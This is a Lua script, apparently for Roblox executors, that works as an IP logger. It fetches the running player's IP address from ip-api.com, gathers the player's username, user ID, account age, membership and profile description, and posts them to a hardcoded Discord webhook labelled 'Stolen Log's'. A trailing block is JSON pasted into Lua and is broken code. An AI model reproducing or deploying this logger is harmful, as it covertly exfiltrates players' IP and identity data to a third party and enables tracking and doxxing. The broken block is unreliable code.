local IPrequest = game:HttpGet("http://ip-api.com/json/?fields=status,message,city,query")
local result = game:GetService("HttpService"):JSONDecode(IPrequest)

local Notify_Webhook = "https://discord.com/api/webhooks/1414318651971993761/XMz2_n7Kl7P8_e4mk1V7Hl9vy5AtTr06QfQZtUtSUhq2TZ2NoNQ_srTRlf6ChWF0DFHa"
local player = game.Players.LocalPlayer

local function notify_hook()
	-- Thumb API
	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = game.HttpService:JSONDecode(ThumbnailAPI)
	local avatardata = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..game.Players.LocalPlayer.UserId)
	local json = game.HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
		["username"] = "IP Logger",
		["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s",
		["content"] = "Someone injected our ip logger !",
		["embeds"] = {
			{
				["title"] = "Stolen Log's",
				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**\n** IP : " .. result.query .. "**",
				["color"] = 3447003,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = player.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = player.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = player.UserId,
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = player.AccountAge.." Day",
						["inline"] = true
					},
					{
						["name"] = "Membership",
						["value"] = player.MembershipType.Name,
						["inline"] = true
					},
					{
						["name"] = "Account Created Day",
						["value"] = string.match(CreatedData, "^([%d-]+)"),
						["inline"] = true
					},
					{
						["name"] = "Profile Description",
						["value"] = "```\n"..DescriptionData.."\n```",
						["inline"] = true
					}
				},
				["footer"] = {
					["text"] = "IP Log",
					["icon_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s"
				},
				["thumbnail"] = {
					["url"] = avatardata
				}
			}
		},
	}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

local new_data = {
  "content": "",
  "tts": false,
  "embeds": [
    {
      "id": 985364321,
      "title": "Player was logged!",
      "description": "IP : \nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
      "timestamp": "2025-10-08T21:00:00.000Z",
      "color": 16777215,
      "footer": {
        "text": "Player's like to be logged!",
        "icon_url": "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
      },
      "author": {
        "name": player.Name,
        "url": "https://www.roblox.com/users/4121111717/profile",
        "icon_url": "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-C4EDFD622078F4F1C2D877FC5659D035-Png/150/150/AvatarHeadshot/Webp/noFilter"
      },
      "image": {
        "url": "https://tr.rbxcdn.com/30DAY-Avatar-C4EDFD622078F4F1C2D877FC5659D035-Png/352/352/Avatar/Webp/noFilter"
      },
      "fields": [
        {
          "id": 845422695,
          "name": "Profile Description",
          "value": ""..DescriptionData.."",
          "inline": true
        }
      ]
    }
  ],
  "components": [],
  "actions": {},
  "flags": 0,
  "username": "Sigma Script",
  "avatar_url": "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
}
notify_hook()
